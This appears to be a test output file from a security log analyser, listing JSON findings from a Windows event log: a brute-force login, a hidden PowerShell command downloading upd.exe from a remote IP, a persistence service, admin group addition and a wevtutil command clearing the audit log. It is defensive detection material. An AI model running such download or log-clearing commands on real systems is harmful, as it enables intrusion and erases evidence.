@@ -1,0 +1,295 @@
+{
+ "findings": [
+  {
+   "type": "Failed Login",
+   "category": "Authentication",
+   "severity": "medium",
+   "ruleConfidence": 0.9,
+   "explanation": "A failed authentication attempt was detected.",
+   "line": "2026-04-12T01:58:02Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "rawLine": "2026-04-12T01:58:02Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "lineNumber": 1,
+   "timestamp": "2026-04-12T01:58:02.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4625",
+   "matchedRules": [
+    "Failed Login"
+   ]
+  },
+  {
+   "type": "Failed Login",
+   "category": "Authentication",
+   "severity": "medium",
+   "ruleConfidence": 0.9,
+   "explanation": "A failed authentication attempt was detected.",
+   "line": "2026-04-12T01:58:40Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "rawLine": "2026-04-12T01:58:40Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "lineNumber": 2,
+   "timestamp": "2026-04-12T01:58:40.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4625",
+   "matchedRules": [
+    "Failed Login"
+   ]
+  },
+  {
+   "type": "Failed Login",
+   "category": "Authentication",
+   "severity": "medium",
+   "ruleConfidence": 0.9,
+   "explanation": "A failed authentication attempt was detected.",
+   "line": "2026-04-12T01:59:13Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "rawLine": "2026-04-12T01:59:13Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "lineNumber": 3,
+   "timestamp": "2026-04-12T01:59:13.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4625",
+   "matchedRules": [
+    "Failed Login"
+   ]
+  },
+  {
+   "type": "Failed Login",
+   "category": "Authentication",
+   "severity": "medium",
+   "ruleConfidence": 0.9,
+   "explanation": "A failed authentication attempt was detected.",
+   "line": "2026-04-12T01:59:51Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "rawLine": "2026-04-12T01:59:51Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "lineNumber": 4,
+   "timestamp": "2026-04-12T01:59:51.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4625",
+   "matchedRules": [
+    "Failed Login"
+   ]
+  },
+  {
+   "type": "Failed Login",
+   "category": "Authentication",
+   "severity": "medium",
+   "ruleConfidence": 0.9,
+   "explanation": "A failed authentication attempt was detected.",
+   "line": "2026-04-12T02:00:27Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "rawLine": "2026-04-12T02:00:27Z host=WS01 EventID=4625 logon failure user=jdoe source=45.155.205.18 failed login",
+   "lineNumber": 5,
+   "timestamp": "2026-04-12T02:00:27.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4625",
+   "matchedRules": [
+    "Failed Login"
+   ]
+  },
+  {
+   "type": "IP Detected",
+   "category": "Network Indicator",
+   "severity": "info",
+   "ruleConfidence": 0.7,
+   "explanation": "An IPv4 address was found in the log event.",
+   "line": "2026-04-12T02:01:05Z host=WS01 EventID=4624 logon success user=jdoe source=45.155.205.18 logon type 10",
+   "rawLine": "2026-04-12T02:01:05Z host=WS01 EventID=4624 logon success user=jdoe source=45.155.205.18 logon type 10",
+   "lineNumber": 6,
+   "timestamp": "2026-04-12T02:01:05.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4624",
+   "matchedRules": []
+  },
+  {
+   "type": "Suspicious Command",
+   "category": "Execution",
+   "severity": "high",
+   "ruleConfidence": 0.8,
+   "explanation": "The event contains a command or utility commonly associated with suspicious execution.",
+   "line": "2026-04-12T02:14:02Z host=WS01 EventID=4688 user=jdoe process=powershell.exe command executed: powershell -nop -w hidden -EncodedCommand SQBFAFgA... download http://185.77.22.90/upd.exe",
+   "rawLine": "2026-04-12T02:14:02Z host=WS01 EventID=4688 user=jdoe process=powershell.exe command executed: powershell -nop -w hidden -EncodedCommand SQBFAFgA... download http://185.77.22.90/upd.exe",
+   "lineNumber": 8,
+   "timestamp": "2026-04-12T02:14:02.000Z",
+   "ip": "185.77.22.90",
+   "sourceIp": "185.77.22.90",
+   "destinationIp": null,
+   "allIps": [
+    "185.77.22.90"
+   ],
+   "indicators": [
+    "185.77.22.90"
+   ],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": "powershell.exe",
+   "eventId": "4688",
+   "matchedRules": [
+    "Suspicious Command"
+   ]
+  },
+  {
+   "type": "Persistence Indicator",
+   "category": "Persistence",
+   "severity": "high",
+   "ruleConfidence": 0.8,
+   "explanation": "The event contains a possible persistence mechanism.",
+   "line": "2026-04-12T02:15:40Z host=WS01 EventID=7045 user=jdoe service installed UpdaterSvc image C:\\Users\\Public\\upd.exe",
+   "rawLine": "2026-04-12T02:15:40Z host=WS01 EventID=7045 user=jdoe service installed UpdaterSvc image C:\\Users\\Public\\upd.exe",
+   "lineNumber": 9,
+   "timestamp": "2026-04-12T02:15:40.000Z",
+   "ip": null,
+   "sourceIp": null,
+   "destinationIp": null,
+   "allIps": [],
+   "indicators": [],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": "C",
+   "eventId": "7045",
+   "matchedRules": [
+    "Persistence Indicator"
+   ]
+  },
+  {
+   "type": "Privilege Escalation",
+   "category": "Privilege",
+   "severity": "high",
+   "ruleConfidence": 0.85,
+   "explanation": "The event contains a possible privilege change or elevation.",
+   "line": "2026-04-12T02:19:52Z host=WS01 EventID=4732 user=jdoe added to administrators group",
+   "rawLine": "2026-04-12T02:19:52Z host=WS01 EventID=4732 user=jdoe added to administrators group",
+   "lineNumber": 10,
+   "timestamp": "2026-04-12T02:19:52.000Z",
+   "ip": null,
+   "sourceIp": null,
+   "destinationIp": null,
+   "allIps": [],
+   "indicators": [],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "4732",
+   "matchedRules": [
+    "Privilege Escalation"
+   ]
+  },
+  {
+   "type": "Log Tampering",
+   "category": "Defense Evasion",
+   "severity": "high",
+   "ruleConfidence": 0.9,
+   "explanation": "The event suggests an attempt to alter, clear, or disable audit evidence.",
+   "line": "2026-04-12T02:23:10Z host=WS01 EventID=1102 user=jdoe wevtutil cl Security audit log cleared",
+   "rawLine": "2026-04-12T02:23:10Z host=WS01 EventID=1102 user=jdoe wevtutil cl Security audit log cleared",
+   "lineNumber": 11,
+   "timestamp": "2026-04-12T02:23:10.000Z",
+   "ip": null,
+   "sourceIp": null,
+   "destinationIp": null,
+   "allIps": [],
+   "indicators": [],
+   "user": "jdoe",
+   "host": "WS01",
+   "process": null,
+   "eventId": "1102",
+   "matchedRules": [
+    "Log Tampering"
+   ]
+  },
+  {
+   "type": "Brute Force Activity",
+   "category": "Authentication Attack",
+   "severity": "high",
+   "ruleConfidence": 0.98,
+   "explanation": "5 failed login events occurred within five minutes for jdoe from 45.155.205.18.",
+   "line": "Aggregated detection across normalized log events",
+   "rawLine": null,
+   "lineNumber": null,
+   "timestamp": "2026-04-12T02:00:27.000Z",
+   "ip": "45.155.205.18",
+   "sourceIp": "45.155.205.18",
+   "destinationIp": null,
+   "allIps": [
+    "45.155.205.18"
+   ],
+   "indicators": [
+    "45.155.205.18"
+   ],
+   "user": "jdoe",
+   "host": null,
+   "process": null,
+   "eventId": null,
+   "matchedRules": [
+    "Failed Login",
+    "Brute Force Activity"
+   ],
+   "aggregate": true,
+   "eventCount": 5
+  }
+ ],
+ "meta": {
+  "format": "Windows Event Log",
+  "risk": "HIGH",
+  "totalLines": 12
+ }
+}
